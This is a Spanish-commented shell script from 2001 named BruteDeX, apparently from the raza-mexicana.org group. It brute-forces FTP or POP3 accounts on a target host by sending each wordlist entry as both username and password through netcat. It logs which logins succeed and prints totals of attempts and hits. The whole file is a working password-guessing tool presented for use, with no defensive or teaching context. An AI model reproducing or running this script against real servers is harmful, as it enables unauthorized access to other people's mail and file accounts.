#!/bin/sh
# Bruteforcer de FTP/POP3 sin dar saltos de usuario/password.
# Por dex: dex@raza-mexicana.org <> www.raza-mexicana.org
# Modificado: Jul/21/2001

rm -rf .che

VERSION="v1.1"
HOST=$1
WORD=$2
LOG=$3
VER=$4
POP=$5
TYPE="FTP"
PORT=21
MANY=0
NUM=0
FAL=0

if [ "$3" = "" ]; then
printf "[X] Sintaxis: $0 <host> <wordlist> <log> [-v] [-p puerto] [-t]\n"
echo "[X] [-v]: verbose"
echo "[X] [-p]: puerto"
echo "[X] [-t]: bruteforce al pop3 (FTP por default)"
exit
fi

# Lo hice al ultimo, ya ni ganas tenia de pensar.
if [ "$4" = "-v" ]; then VER=1; fi
if [ "$5" = "-v" ]; then VER=1; fi 
if [ "$6" = "-v" ]; then VER=1; fi
if [ "$7" = "-v" ]; then VER=1; fi
if [ "$4" = "-p" ]; then PORT=$5; fi 
if [ "$5" = "-p" ]; then PORT=$6; fi
if [ "$6" = "-p" ]; then PORT=$7; fi
if [ "$7" = "-p" ]; then PORT=$8; fi
if [ "$4" = "-t" ]; then TYPE="POP3"; fi
if [ "$5" = "-t" ]; then TYPE="POP3"; fi
if [ "$6" = "-t" ]; then TYPE="POP3"; fi
if [ "$7" = "-t" ]; then TYPE="POP3"; fi

if [ "$7" != "" ]; then
TYPE="POP3"
fi

echo "[X] BruteDeX $VERSION by DeX. <-> dex@raza-mexicana.org <-> www.raza-mexicana.org"
echo "=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="

rm -rf $LOG
set $(cat $WORD) 
if [ "$TYPE" = "FTP" ]; then
echo "[X] Bruteforcing FTP..."
echo "- - - - - - - - - - - - - - - - - - - -"

while [ "$1" != "" ]
do

(printf "user $1\npass $1\nquit\n") | nc -v $HOST $PORT > .che 2>/dev/null 

if [ "`grep 220 .che`" = "" ]; then
echo "[ ] Error Conectando al host." >> $LOG

if [ "$VER" = "1" ]; then
echo "[ ] Error Conectando al host."
fi
exit;

fi

if [ "`grep 230 .che`" != "" ]; then

echo "[*] $1:$1 [SI]" >> $LOG

if [ "$VER" = "1" ]; then
echo "[*] $1:$1 [SI]" 
fi
let NUM=NUM+1
rm -rf .che

else

echo "[ ] $1:$1 [NO]" >> $LOG
let FAL=FAL+1
if [ "$VER" = "1" ]; then
echo "[ ] $1:$1 [NO]"
fi

rm -rf .che
fi

shift
let MANY=MANY+1 
done

echo "- - - - - - - - - - - - - - - - - - - -"
echo "[X] Acabado."
echo "[X] Logins intentados:  $MANY" 
echo "[X] Logins encontrados: $NUM"
echo "[X] Logins fallidos:    $FAL"
exit;

else

PORT=110

echo "[X] Bruteforcing POP3..."
echo "- - - - - - - - - - - - - - - - - - - -"

while [ "$1" != "" ]
do

(printf "user $1\npass $1\nquit\n") | nc -v $HOST $PORT > .che 2>/dev/null 

if [ "`grep +OK .che`" = "" ]; then
echo "[ ] Error Conectando al host." >> $LOG

if [ "$VER" = "1" ]; then
echo "[ ] Error Conectando al host."
fi
exit;
fi

if [ "`grep "\-\ERR" .che`" = "" ]; then

echo "[*] $1:$1 [SI]" >> $LOG

if [ "$VER" = "1" ]; then
echo "[*] $1:$1 [SI]" 
fi
let NUM=NUM+1
rm -rf .che


else

echo "[ ] $1:$1 [NO]" >> $LOG

if [ "$VER" = "1" ]; then
echo "[ ] $1:$1 [NO]"
fi
let FAL=FAL+1
rm -rf .che
fi

shift
let MANY=MANY+1
done

echo "- - - - - - - - - - - - - - - - - - - -"
echo "[X] Acabado."
echo "[X] Logins intentados:  $MANY"
echo "[X] Logins encontrados: $NUM"
echo "[X] Logins fallidos:    $FAL"

exit;

fi
